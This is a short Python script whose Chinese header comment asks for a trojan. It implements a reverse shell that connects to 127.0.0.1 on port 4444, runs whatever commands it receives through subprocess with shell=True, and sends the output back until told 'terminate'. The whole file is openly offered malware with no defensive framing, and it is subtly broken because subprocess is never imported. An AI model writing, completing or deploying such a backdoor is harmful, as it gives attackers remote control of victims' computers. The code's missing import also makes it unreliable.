#写python一个木马
import os
import socket

host = "127.0.0.1"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
    command = s.recv(1024)
    command = command.decode('utf-8')
    if 'terminate' in command:
        s.close()
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(CMD.stdout.read())
        s.send(CMD.stderr.read())